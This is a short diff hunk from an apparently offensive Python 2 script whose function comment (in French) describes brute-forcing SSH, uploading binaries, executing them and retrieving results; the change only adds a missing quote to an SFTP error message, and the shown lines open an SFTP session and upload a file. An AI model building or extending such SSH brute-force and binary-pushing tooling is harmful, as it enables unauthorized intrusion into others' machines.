@@ -217,7 +217,7 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 		try:
 			sftp = ssh.open_sftp()
 		except:
-			print "[*] erreur lors de l'ouverture di tunnel SFTP
+			print "[*] erreur lors de l'ouverture di tunnel SFTP"
 		try:
 			sftp.put(source,destination)
 				except:
